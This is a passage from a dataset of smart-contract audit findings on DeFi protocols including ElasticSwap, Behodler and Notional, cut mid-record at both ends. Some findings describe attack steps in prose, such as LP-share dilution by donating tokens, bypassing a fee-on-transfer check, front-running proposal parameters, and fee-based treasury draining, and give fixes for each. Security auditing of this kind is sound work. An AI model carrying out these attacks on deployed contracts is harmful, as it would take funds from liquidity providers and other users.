    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nIn the current implementation, the amount of LP tokens to be minted when `addLiquidity()` is calculated based on the ratio between the amount of newly added `quoteToken` and the current wallet balance of `quoteToken` in the `Exchange` contract.\n\nHowever, since anyone can transfer `quoteToken` to the contract, and make the balance of `quoteToken` to be larger than `_internalBalances.quoteTokenReserveQty`, existing liquidity providers can take advantage of this by donating `quoteToken` and make future liquidity providers receive fewer LP tokens than expected and lose funds.\n\nhttps://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L578-L582\n\n```solidity\nliquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(\n    _totalSupplyOfLiquidityTokens,\n    quoteTokenQty,\n    _quoteTokenReserveQty // IERC20(quoteToken).balanceOf(address(this))\n);\n```\n\n### PoC\n\nGiven:\n\n- The `Exchange` pool is new;\n\n1. Alice `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`, recived `1e18` LP token;\n2. Alice transfer `99e18 quoteToken` to the `Exchange` pool contract;\n3. Bob `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`;\n3. Bob `removeLiquidity()` with all the LP token in balance.\n\n**Expected Results**: Bob recived `1e18 baseToken` and >= `1e18 quoteToken`.\n\n**Actual Results**: Bob recived ~`0.02e18 baseToken` and ~`1e18 quoteToken`.\n\nAlice can now `removeLiquidity()` and recive ~`1.98e18 baseToken` and ~`100e18 quoteToken`.\n\nAs a result, Bob suffers a fund loss of `0.98e18 baseToken`.\n\n### Recommendation\n\nChange to:\n\n```solidity\nliquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(\n    _totalSupplyOfLiquidityTokens,\n    quoteTokenQty,\n    _internalBalances.quoteTokenReserveQty\n);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-elasticswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-elasticswap-findings",
      "url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/146"
    }
  },
  {
    "title": "Fee-on-transfer check can be avoided",
    "severity": "minor",
    "body": "# Handle\n\nharleythedog\n\n\n# Vulnerability details\n\n## Impact\nIn `Exchange.sol`, there is a check in `addLiquidity` to see if the `base` token is a fee-on-transfer token (and it reverts if it is, since this is not supported and would break a lot of the internal accounting): \n```\nbool isExchangeEmpty = IERC20(baseToken).balanceOf(address(this)) == 0;\n...\nif (isExchangeEmpty) {\n    require(\n        IERC20(baseToken).balanceOf(address(this)) ==\n            tokenQtys.baseTokenQty,\n         \"Exchange: FEE_ON_TRANSFER_NOT_SUPPORTED\"\n    );\n}\n```\n\nThis check can easily be avoided by transferring 1 wei of the base token to the contract before supplying the initial liquidity. This would create an exchange with a fee-on-transfer base token, which is not desirable and new users might interact with these exchanges, not knowing that the exchange logic will not work correctly and thus should not be interacted with.\n\n## Proof of Concept\nSee referenced code [here](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/Exchange.sol#L122).\n\n## Tools Used\nInspection.\n\n## Recommended Mitigation Steps\nInstead of checking if `balanceOf` is 0, the contract should check that the *internalBalance* is 0. So I recommend changing line 123/124 to be:\n```\nbool isExchangeEmpty = internalBalances.baseTokenReserveQty == 0;\n```\nThis way, there is no way of supplying initial liquidity an exchange that has fee-on-transfer tokens as the base token.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-elasticswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-elasticswap-findings",
      "url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/119"
    }
  },
  {
    "title": "Base token properties not verified",
    "body": "# Handle\n\nsirhashalot\n\n\n# Vulnerability details\n\n## Impact\n\nWhen a new exchange is created, there are no checks to verify whether the base token value entered by the user is a quote token or vice versa. A user could create an exchange with 2 quote tokens, 2 base tokens, or the base and quote tokens in reversed positions. Because the math for this DEX assumes the quote and base tokens in certain positions, with different MathLib.sol functions for different cases, breaking this assumption means the math underlying this DEX can produce incorrect values and result in unexpected scenarios that can allow users to extract value from such pools.\n\n## Proof of Concept\n\nThe project documentation describes the base token and quote token as distinct from one another:\n\n- **Base Token**: an arbitrary ERC20 token that may be a token with elastic supply / rebases. (think sOHM, sKLIMA, etc)\n- **Quote Token**: an arbitrary ERC20 token that should be a token that does not rebase / has fixed supply.\n\nAt the same time, the [ExchangeFactory.sol `createNewExchange()` function](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/contracts/ExchangeFactory.sol#L38) never checks whether the _baseToken input parameter is a base token (and not a quote token) and whether the _quoteToken input parameter is a quote token (and not a base token). Because no checks are performed, a user can create a new exchange with any address in the _baseToken and _quoteToken input parameters, leading to tokens being incorrectly categorized as base tokens or quote tokens.\n\nThe math in MathLib.sol is highly dependent on the assumptions of base token and quote tokens being sorted properly. If a pool exists where both tokens are quote tokens, the results calculated in MathLab.sol will be wrong.\n\n## Recommended Mitigation Steps\n\nA simple fix would be to add the onlyOwner modifier to the `createNewExchange()` function, since the owner can be a trusted party. A more complex approach to allow any user to create a new exchange could maintain a whitelist of acceptable base tokens and quote tokens. By checking whether the _baseToken input parameter is in the case token whitelist and doing the same for the _quoteToken input parameter, the `createNewExchange()` function could safely avoid creating an exchange where the tokens meet the DEX assumptions of base token and quote token properties.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-elasticswap-findings",
      "repo": "https://github.com/code-423n4/2022-01-elasticswap-findings",
      "url": "https://github.com/code-423n4/2022-01-elasticswap-findings/issues/111"
    }
  },
  {
    "title": "\"Safe\" ERC20 functions for XDEFI?",
    "body": "# Handle\n\n0xsanson\n\n\n# Vulnerability details\n\n## Impact\nThroughout the code the safe functions `safeTransfer` and `safeTransferFrom` are used when dealing with XDEFI. Isn't this token a standard ERC20? I believe the normal ERC20 transfer functions can be used. The advantage is gaining some 100s gas otherwise spent in unneeded logic.\n\n## Proof of Concept\ngrep safeT *.sol\n\n## Recommended Mitigation Steps\nConsider removing the SafeERC20 library.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-xdefi-findings",
      "repo": "https://github.com/code-423n4/2022-01-xdefi-findings",
      "url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/194"
    }
  },
  {
    "title": "No option to unlock funds before set duration",
    "severity": "minor",
    "body": "# Handle\n\nsirhashalot\n\n\n# Vulnerability details\n\n## Impact\n\nIf a user locks funds in the contract, they can only withdraw funds by calling functions that in turn call the `_unlock()` function. The `_unlock()` function requires the position to have block.timestamp >= position.expiry. If there is a problem with the contract, with the XDEFI ERC20 token, or a user changes their mind and wants their funds back, they do not have this option. This can be more problematic with very long lock duration values.\n\n## Proof of Concept\n\nThere is a hard requirement that block.timestamp >= uint256(expiry) for any position before it can be unlocked and the funds released. All code paths that allow a use to withdraw their XDEFI rely on the `_unlock()` function: \nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L305\n\n## Recommended Mitigation Steps\n\nDifferent options exist to assist users with this issue. One would be to keep lock duration values small, especially when the contract is first released to users. Another is to add an emergency withdrawal function that has the onlyOwner modifier, such as using OpenZeppelin's Pausable module:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol \n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-xdefi-findings",
      "repo": "https://github.com/code-423n4/2022-01-xdefi-findings",
      "url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/183"
    }
  },
  {
    "title": "`XDEFIDistribution.sol#_updateXDEFIBalance()` Avoiding unnecessary storage writes can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nStorage writes (`SSTORE`) to `distributableXDEFI` may not be needed when `previousDistributableXDEFI == currentDistributableXDEFI`, therefore the code can be reorganized to save gas from unnecessary storage writes.\n\nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L330-L336\n\n```solidity\nfunction _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n    uint256 previousDistributableXDEFI = distributableXDEFI;\n    uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;\n\n    return _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI);\n}\n```\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n    uint256 previousDistributableXDEFI = distributableXDEFI;\n    uint256 currentDistributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;\n\n    newFundsTokenBalance_ = _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI);\n    if (newFundsTokenBalance_ != 0) {\n        distributableXDEFI = currentDistributableXDEFI;\n    }\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-xdefi-findings",
      "repo": "https://github.com/code-423n4/2022-01-xdefi-findings",
      "url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/151"
    }
  },
  {
    "title": "`XDEFIDistribution.sol#relock()` Implementation can be simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L120-L125\n\n```solidity=120\nuint256 withdrawAmount = amountUnlocked_ - lockAmount_;\n\nif (withdrawAmount != uint256(0)) {\n    // Send the excess XDEFI to the destination, if needed.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, withdrawAmount);\n}\n```\n\nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L175-L180\n\n```solidity=175\nuint256 withdrawAmount = amountUnlocked_ - lockAmount_;\n\nif (withdrawAmount != uint256(0)) {\n    // Send the excess XDEFI to the destination, if needed.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, withdrawAmount);\n}\n```\n### Recommendation\n\nChange to:\n\n```solidity\nif (amountUnlocked_ > lockAmount_) {\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_ - lockAmount_);\n}\n```\n\n- Removed a local variable: `withdrawAmount`;\n- Only do the arithmetic when needed: `amountUnlocked_ - lockAmount_`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-xdefi-findings",
      "repo": "https://github.com/code-423n4/2022-01-xdefi-findings",
      "url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/123"
    }
  },
  {
    "title": "Gas optimization in XDEFIDistribution.sol - variable that is not used",
    "body": "# Handle\n\nOriDabush\n\n\n# Vulnerability details\n\n## XDEFIDistribution.sol line 332 \nThe \"currentDistributableXDEFI\" variable is not used (can use distributableXDEFI instead).\n```sol\n// function before:\nfunction _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n    uint256 previousDistributableXDEFI = distributableXDEFI;\n    uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;\n    return _toInt256Safe(currentDistributableXDEFI) - _toInt256Safe(previousDistributableXDEFI);\n}\n\n// function after:\nfunction _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n    uint256 previousDistributableXDEFI = distributableXDEFI;\n    distributableXDEFI = IERC20(XDEFI).balanceOf(address(this)) - totalDepositedXDEFI;\n    return _toInt256Safe(distributableXDEFI) - _toInt256Safe(previousDistributableXDEFI);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-xdefi-findings",
      "repo": "https://github.com/code-423n4/2022-01-xdefi-findings",
      "url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/120"
    }
  },
  {
    "title": "Cheaper to use calldata than memory",
    "body": "# Handle\n\nTomio\n\n\n# Vulnerability details\n\n## Impact\nIn the https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/SherBuy.sol#L181 receiver can sweep the token, by inputing all of the address that this contract has, since the _tokens parameter is not going to be changed in this function, its cheaper to use calldata than memory\n\n## Proof of Concept\n```\nfunction sweepTokens(IERC20[] calldata _tokens) external {\n        //if (msg.sender != receiver) revert InvalidSender();\n        //if (active()) revert InvalidState();\n\n    // Loops through the extra tokens (ERC20) provided and sends all of them to the sender address\n        for (uint256 i; i < _tokens.length; i++) {\n            counter += 1;\n            //IERC20 token = _tokens[i];\n            //token.safeTransfer(msg.sender, token.balanceOf(address(this)));\n        }\n    }\n    // 48066 using memory\n    // 46686 using calldata\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-sherlock-findings",
      "repo": "https://github.com/code-423n4/2022-01-sherlock-findings",
      "url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/249"
    }
  },
  {
    "title": "Gas in `FlashGovernanceArbiter.assertGovernanceApproved()`: `flashGovernanceConfig.asset` and `flashGovernanceConfig.amount` should get cached",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact\nSLOADs are expensive (~100 gas) compared to MLOADs/MSTOREs (~3 gas). Minimizing them can save gas.\n\n## Proof of Concept\nThe code is as such (see @audit tags):\n```\nFile: FlashGovernanceArbiter.sol\n60:   function assertGovernanceApproved(\n61:     address sender,\n62:     address target,\n63:     bool emergency\n64:   ) public {\n65:     if (\n66:       pendingFlashDecision[target][sender].unlockTime < block.timestamp && \n67:       IERC20(flashGovernanceConfig.asset).transferFrom(sender, address(this), flashGovernanceConfig.amount) //@audit flashGovernanceConfig.amount SLOAD 1 //@audit flashGovernanceConfig.asset SLOAD 1\n68:     ) {\n69:       require(\n70:         emergency || (block.timestamp - security.lastFlashGovernanceAct > security.epochSize), \n71:         \"Limbo: flash governance disabled for rest of epoch\"\n72:       );\n73:       pendingFlashDecision[target][sender] = flashGovernanceConfig;\n74:       pendingFlashDecision[target][sender].unlockTime += block.timestamp;\n75: \n76:       security.lastFlashGovernanceAct = block.timestamp;\n77:       emit flashDecision(sender, flashGovernanceConfig.asset, flashGovernanceConfig.amount, target); //@audit flashGovernanceConfig.amount SLOAD 2 //@audit flashGovernanceConfig.asset SLOAD 2\n78:     } else {\n79:       revert(\"LIMBO: governance decision rejected.\");\n80:     }\n81:   }\n```\nIt's possible to save 2 SLOAD (~200 gas) by caching `flashGovernanceConfig.asset` in a `address` variable, and  `flashGovernanceConfig.amount` in a `uint256` memory variables and use them instead of reading them repeatedly from storage.\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nCache the storage values in memory variables and use them instead of repeatedly reading them from storage.\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/336"
    }
  },
  {
    "title": "Gas in `LimboDAO.seed()`: Avoiding a 2N for-loop for a N one",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact\nLooping twice is expensive. It's possible to iterate only once from 0 to maxLength.\n\n## Proof of Concept\nOriginal code iterating between N and 2N times here: https://github.com/code-423n4/2022-01-behodler/blob/71d8e0cfd9388f975d6a90dffba9b502b222bdfe/contracts/DAO/LimboDAO.sol#L195-L222\n\nIt's possible to iterate only N times on `sushiLPs` and `uniLPs`.\nHere's the refacto I suggest, it starts from the comment `//@audit refacto starts here` and ends with `//@audit refacto ends here`:\n```\nFile: LimboDAO.sol\n213:     //@audit refacto starts here\n214:     bool isSushiBigger = sushiLPs.length >= uniLPs.length;\n215:     (uint256 shortLength, uint256 longLength) = isSushiBigger ? (uniLPs.length, sushiLPs.length) : (sushiLPs.length, uniLPs.length);\n216: \n217:     for (uint256 i; i < shortLength; ++i) {\n218:       sushiLoop(sushiLPs[i]);\n219:       uniLoop(uniLPs[i]);\n220:     }\n221:     \n222:     if (isSushiBigger) {\n223:       for (uint256 i = shortLength; i < longLength; ++i) {\n224:         sushiLoop(sushiLPs[i]);\n225:       }\n226:     } else {\n227:       for (uint256 i = shortLength; i < longLength; ++i) {\n228:         uniLoop(uniLPs[i]);\n229:       }\n230:     }\n231:   }\n232: \n233:   function sushiLoop(\n234:     address sushiLp\n235:   ) private {\n236:     require(UniPairLike(sushiLp).factory() == sushiFactory, \"LimboDAO: invalid Sushi LP\");\n237:     if (IERC20(eye).balanceOf(sushiLp) > 1000) assetApproved[sushiLp] = true;\n238:     fateGrowthStrategy[sushiLp] = FateGrowthStrategy.indirectTwoRootEye;\n239:   }\n240: \n241:   function uniLoop(\n242:     address uniLP\n243:   ) private {\n244:     require(UniPairLike(uniLP).factory() == uniFactory, \"LimboDAO: invalid Uni LP\"); //@audit-info Dravee: I corrected the comment\n245:     if (IERC20(eye).balanceOf(uniLP) > 1000) assetApproved[uniLP] = true;\n246:     fateGrowthStrategy[uniLP] = FateGrowthStrategy.indirectTwoRootEye;\n247:   }\n248:   //@audit refacto ends here\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nApply the suggested refacto\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/309"
    }
  },
  {
    "title": "Lack of access control in the `parameterize` function of proposal contracts",
    "severity": "medium",
    "body": "# Handle\n\nshw\n\n\n# Vulnerability details\n\n## Impact\n\nMost of the proposal contracts have a `parameterize` function for setting the proposal parameters, and these functions are protected only by the `notCurrent` modifier. When the proposal is proposed through a `lodgeProposal` transaction, an attacker can front-run it, modify the proposal parameters, and let the community vote it down. As a result, the person proposing loses his `fate` deposit.\n\n## Proof of Concept\n\n1. A benign user Alice wants to make a proposal, so she deploys one of the proposal contracts and sets the intended parameters. Her proposal is approved by the `ProposalFactory` and is ready to be proposed.\n2. Alice calls the `lodgeProposal` function of `ProposalFactory` to propose her proposal.\n3. An attacker Bob, who listens to the mempool, notices Alice's transaction and front-runs it. He calls the `parameterize` function to change the parameters to undesirable ones.\n4. Alice's proposal becomes the current proposal. However, the community rejects the proposal because of the changed parameters, causing Alice to lose her deposit.\n\nReferenced code:\n[DAO/Proposals/BurnFlashStakeDeposit.sol#L25-L37](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/BurnFlashStakeDeposit.sol#L25-L37)\n[DAO/Proposals/SetAssetApprovalProposal.sol#L21-L24](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/SetAssetApprovalProposal.sol#L21-L24)\n[DAO/Proposals/ToggleWhitelistProposalProposal.sol#L22-L28](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/ToggleWhitelistProposalProposal.sol#L22-L28)\n[DAO/Proposals/UpdateMultipleSoulConfigProposal.sol#L40-L61](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/UpdateMultipleSoulConfigProposal.sol#L40-L61)\n[DAO/Proposals/WithdrawERC20Proposal.sol#L26-L32](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/WithdrawERC20Proposal.sol#L26-L32)\n[DAO/ProposalFactory.sol#L74-L78](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/ProposalFactory.sol#L74-L78)\n\n## Recommended Mitigation Steps\n\nOnly allow the creator of the proposal to modify the parameters.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/296"
    }
  },
  {
    "title": "Gas in `TransferHelper.ERC20NetTransfer`: check if amount != 0 before transfer",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact \nChecking non-zero transfer values can avoid an external call to save gas. \n\n## Proof of Concept \nHere, the code is as such:\n``` \nFile: LimboDAO.sol\n21:     if (amount > 0) { \n22:       require(IERC20(token).transferFrom(from, to, uint256(amount)), \"LimboDAO: ERC20 transfer from failed.\");\n23:     } else {\n24:       require(IERC20(token).transfer(from, uint256(amount * (-1))), \"LimboDAO: ERC20 transfer failed.\");\n25:     }\n``` \nwhile it should be as such to avoid making an unnecessary external call:\n```\nFile: LimboDAO.sol\n21:     if (amount > 0) { \n22:       require(IERC20(token).transferFrom(from, to, uint256(amount)), \"LimboDAO: ERC20 transfer from failed.\");\n23:     } else if (amount != 0) {\n24:       require(IERC20(token).transfer(from, uint256(amount * (-1))), \"LimboDAO: ERC20 transfer failed.\");\n25:     }\n```\n\n## Tools Used \nVS Code \n\n## Recommended Mitigation Steps \nCheck if amount != 0.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/290"
    }
  },
  {
    "title": "Consistently check account balance before and after transfers for Fee-On-Transfer discrepencies",
    "severity": "medium",
    "body": "# Handle\n\nDravee\n\n\n# Vulnerability details\n\n## Impact\nWrong fateBalance bookkeeping for a user.\nWrong fateCreated value emitted.\n\n## Proof of Concept\nTaking into account the FOT is done almost everywhere important in the solution already. That's a known practice in the solution.\n\nHowever, it's missing here (see @audit-info tags):\n```\nFile: LimboDAO.sol\n383:   function burnAsset(address asset, uint256 amount) public isLive incrementFate {\n384:     require(assetApproved[asset], \"LimboDAO: illegal asset\");\n385:     address sender = _msgSender();\n386:     require(ERC677(asset).transferFrom(sender, address(this), amount), \"LimboDAO: transferFailed\"); //@audit-info FOT not taken into account\n387:     uint256 fateCreated = fateState[_msgSender()].fateBalance;\n388:     if (asset == domainConfig.eye) {\n389:       fateCreated = amount * 10; //@audit-info wrong amount due to lack of FOT calculation\n390:       ERC677(domainConfig.eye).burn(amount);//@audit-info wrong amount due to lack of FOT calculation\n391:     } else {\n392:       uint256 actualEyeBalance = IERC20(domainConfig.eye).balanceOf(asset);\n393:       require(actualEyeBalance > 0, \"LimboDAO: No EYE\");\n394:       uint256 totalSupply = IERC20(asset).totalSupply();\n395:       uint256 eyePerUnit = (actualEyeBalance * ONE) / totalSupply;\n396:       uint256 impliedEye = (eyePerUnit * amount) / ONE;//@audit-info wrong amount due to lack of FOT calculation\n397:       fateCreated = impliedEye * 20;\n398:     }\n399:     fateState[_msgSender()].fateBalance += fateCreated; //@audit-info potentially wrong fateCreated as fateCreated can be equal to amount * 10;  \n400:     emit assetBurnt(_msgSender(), asset, fateCreated);//@audit-info potentially wrong fateCreated emitted\n401:   }\n```\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nCheck the balance before and after the transfer to take into account the Fees-On-Transfer\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/237"
    }
  },
  {
    "title": "Unstake wont work if pending reward is 0",
    "severity": "minor",
    "body": "# Handle\n\ncsanuragjain\n\n\n# Vulnerability details\n\n## Impact\nUser wont be able to unstake amount temporarily\n\n## Proof of Concept\n\n1. Navigate to _unstake function at https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol\n\n```\n  function _unstake(\n    address token,\n    uint256 amount,\n    address unstaker,\n    address holder\n  ) internal {\n    .....\n\n    uint256 pending = getPending(user, soul);\n\n    if (pending > 0 && amount > 0) {\n      user.stakedAmount = user.stakedAmount - amount;\n      IERC20(token).safeTransfer(address(unstaker), amount);\n      rewardAdjustDebt(unstaker, pending, soul.accumulatedFlanPerShare, user);\n      emit Unstaked(unstaker, token, amount);\n    }\n  }\n```\n\n2.  Observe that IERC20(token).safeTransfer to unstaker is only happening if both pending and amount is greater than 0. This means if user has 0 pending rewards (could happen if user has just claimed reward via claimReward) then unstaking wont happen as if condition will be bypassed\n\n## Recommended Mitigation Steps\nThe code should be changed like below:\n\n```\n  function _unstake(\n    address token,\n    uint256 amount,\n    address unstaker,\n    address holder\n  ) internal {\n    .....\n\n     uint256 pending = getPending(user, soul);\n      user.stakedAmount = user.stakedAmount - amount;\n      IERC20(token).safeTransfer(address(unstaker), amount); \n\n    if (pending > 0) {\nrewardAdjustDebt(unstaker, pending, soul.accumulatedFlanPerShare, user);\n    }\n\n      emit Unstaked(unstaker, token, amount);\n  }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/210"
    }
  },
  {
    "title": "transferFrom gas improvement",
    "body": "# Handle\n\nsirhashalot\n\n\n# Vulnerability details\n\n## Impact\n\nThe ERC20Burnable.sol file has code copied from the OpenZeppelin ERC20.sol contract. The Behodler code `transferFrom()` function does use the latest version of the OpenZeppelin code, modified earlier in Jan 2022 in [PR 3085](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085), which can save gas if currentAllowance == type(uint256).max.\n\nA second gas savings that has been present in OpenZeppelin for some time but is not in the Behodler code is to add an unchecked clause around the `approve()` call.\n\n## Proof of Concept\n\nThe Behodler `transferFrom()` function [doesn't use the latest edits from OZ or the unchecked clause on the approve call](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/ERC677/ERC20Burnable.sol#L204-L218). In contrast, the OZ code [does use these edits for gas savings](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4f8af2dceb0fbc36cb32eb2cc14f80c340b9022e/contracts/token/ERC20/ERC20.sol#L156-L172).\n\n## Recommended Mitigation Steps\n\nUse the latest OZ edits and the unchecked clause for gas savings if it doesn't introduce overflow or underflow conditions.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-behodler-findings",
      "repo": "https://github.com/code-423n4/2022-01-behodler-findings",
      "url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/187"
    }
  },
  {
    "title": "A Malicious Treasury Manager Can Burn Treasury Tokens By Setting `makerFee` To The Amount The Maker Receives",
    "severity": "major",
    "body": "# Handle\n\nleastwood\n\n\n# Vulnerability details\n\n## Impact\n\nThe treasury manager contract holds harvested assets/`COMP` from Notional which are used to perform `NOTE` buybacks or in other areas of the protocol. The manager account is allowed to sign off-chain orders used on 0x to exchange tokens to `WETH` which can then be deposited in the Balancer LP and distributed to `sNOTE` holders.\n\nHowever, `_validateOrder` does not validate that `takerFee` and `makerFee` are set to zero, hence, it is possible for a malicious manager to receive tokens as part of a swap, but the treasury manager contract receives zero tokens as `makerFee` is set to the amount the maker receives. This can be abused to effectively burn treasury tokens at no cost to the order taker.\n\n## Proof of Concept\n\nhttps://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250\n\nhttps://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibFillResults.sol#L59-L91\n\nhttps://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188\n```\nfunction _validateOrder(bytes memory order) private view {\n    (\n        address makerToken,\n        address takerToken,\n        address feeRecipient,\n        uint256 makerAmount,\n        uint256 takerAmount\n    ) = _extractOrderInfo(order);\n\n    // No fee recipient allowed\n    require(feeRecipient == address(0), \"no fee recipient allowed\");\n\n    // MakerToken should never be WETH\n    require(makerToken != address(WETH), \"maker token must not be WETH\");\n\n    // TakerToken (proceeds) should always be WETH\n    require(takerToken == address(WETH), \"taker token must be WETH\");\n\n    address priceOracle = priceOracles[makerToken];\n\n    // Price oracle not defined\n    require(priceOracle != address(0), \"price oracle not defined\");\n\n    uint256 slippageLimit = slippageLimits[makerToken];\n\n    // Slippage limit not defined\n    require(slippageLimit != 0, \"slippage limit not defined\");\n\n    uint256 oraclePrice = _toUint(\n        AggregatorV2V3Interface(priceOracle).latestAnswer()\n    );\n\n    uint256 priceFloor = (oraclePrice * slippageLimit) /\n        SLIPPAGE_LIMIT_PRECISION;\n\n    uint256 makerDecimals = 10**ERC20(makerToken).decimals();\n\n    // makerPrice = takerAmount / makerAmount\n    uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;\n\n    require(makerPrice >= priceFloor, \"slippage is too high\");\n}\n```\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider checking that `makerFee == 0` and `takerFee == 0` in `EIP1271Wallet._validateOrder` s.t. the treasury manager cannot sign unfair orders which severely impact the `TreasuryManager` contract.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-01-notional-findings",
      "repo": "https://github.com/code-423n4/2022-01-notional-findings",
      "url": "https://github.com/code-423n4/2022-01-notional-findings/issues/230"
    }
  },
  {
    "title": "Improper Contract Upgrades Can Lead To Loss Of Contract Ownership",
